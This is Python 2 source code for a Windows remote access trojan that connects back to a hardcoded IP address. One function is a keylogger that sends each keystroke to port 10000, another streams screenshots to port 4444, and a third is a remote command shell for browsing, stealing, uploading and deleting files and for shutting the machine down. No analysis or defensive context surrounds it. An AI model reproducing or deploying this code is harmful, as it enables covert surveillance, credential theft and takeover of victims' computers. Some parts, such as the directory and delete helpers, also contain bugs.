ip='172.16.108.130'
import pyHook,pythoncom,sys,logging
import socket
from threading import Thread
from time import sleep
import autopy
import os
import shutil
import inspect
import atexit
import multiprocessing
from multiprocessing import forking

# error log
try:
    sys.stderr = open("D:\my_stderr.log", "w")
except:
    pass


  
class _Popen(forking.Popen):
    def __init__(self, *args, **kw):
        if hasattr(sys, 'frozen'):
            os.putenv('_MEIPASS2', sys._MEIPASS)
        try:
            super(_Popen, self).__init__(*args, **kw)
        finally:
            if hasattr(sys, 'frozen'):
                os.unsetenv('_MEIPASS2')


class Process(multiprocessing.Process):
    _Popen = _Popen



def back_dir():
    path=os.getcwd()
    print path
    s=path.split('\\')
    length=len(s)
    x=0
    
    while x<(length-1):
        if x==0:
            back_path=s[x]+"\\"
        else:
            back_path=back_path+s[x]+"\\"
        x+=1

    os.chdir(back_path)

# key logger yarra
def attack1():
        server1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        loop1='on'
        while loop1=='on':
                try:
                        sleep(1)
                        server1.connect((ip,10000))
                        loop1='off'
                except:
                        pass
        def OnKeyboardEvent(event):
                k=chr(event.Ascii)
                server1.send(k)
                #print str(k)
                return None
            
        hooks_manager=pyHook.HookManager()
        hooks_manager.KeyDown=OnKeyboardEvent
        hooks_manager.HookKeyboard()
        pythoncom.PumpMessages()

        

def attack2():
        server3=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        loop3='on'
        while loop3=='on':
                try:
                        sleep(1)
                        server3.connect((ip,4444))
                        loop3='off'
                except:
                        pass
                time_interval=3
                try:
                        time_interval=server3.recv(1024)
                except:
                        pass
        
                while True:
                        sleep(float(time_interval))
                        bitmap=autopy.bitmap.capture_screen()
                        bitmap.save('1.png')
                        with open('1.png','rb') as f:
                                bytes_to_send=f.read(1024)
                                
                                server3.send(bytes_to_send)
                                
                                while bytes_to_send !="":
                                        bytes_to_send=f.read(1024)
                                        if bytes_to_send=="":
                                                server3.send('stop it')
                                                
                                        else:
                                                server3.send(bytes_to_send)
                        


def attack3():
        server4=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        loop4='on'
        while loop4=='on':
                try:
                        sleep(1)
                        server4.connect((ip,10008))
                        loop4='off'
                except:
                        pass

        while True:
                command=server4.recv(1024)
                #print command
                if command=="cd..":
                        try:
                                back_dir(os.getcwd())
                        except:
                                pass
                elif command[:3]=="cd ":
                        try:
                                os.chdir(command[3:])
                        except:
                                pass
                elif command=="ls":
                        data=os.listdir(os.getcwd())
                        i=0
                        d=''
                        while i<len(data):
                                d=d+'$$%%'+data[i]
                                #print len(data)
                                i+=1
                                
                        server4.send(d)

                elif command[:4]=="get ":
                        f=open(command[4:],'rb')
                        size=os.path.getsize(command[4:])
                        server4.send(str(size))
                        data=f.read(2048)
                        server4.send(data)
                        while data!="":
                                data=''
                                data=f.read(2048)
                                if data=="":
                                        server4.send('stop it')
                                else:
                                        server4.send(data)
                                
        
                elif command[:6]=="mkdir ":
                        os.mkdir(command[6:])

                elif command[:7]=="upload ":
                        size=server4.recv(1024)
                        data=server4.recv(2048)
                        while data[-7:]!='stop it':
                                f=open(command[7:],'ab')
                                f.write(data)
                                f.close()
                                data=''
                                data=server4.recv(2048)
                elif command=="pwd":
                        path=os.getcwd()
                        server4.send(path)

                elif command[:5]=="del_d":
                        try:
                                os.rmtree(command[6:])
                        except:
                                pass

                elif command[:5]=="del_f":
                        try:
                                os.remove(command[6:])
                                
                        except:
                                pass

                elif command=="shutdown":
                        os.system('shutdown -s')
                        
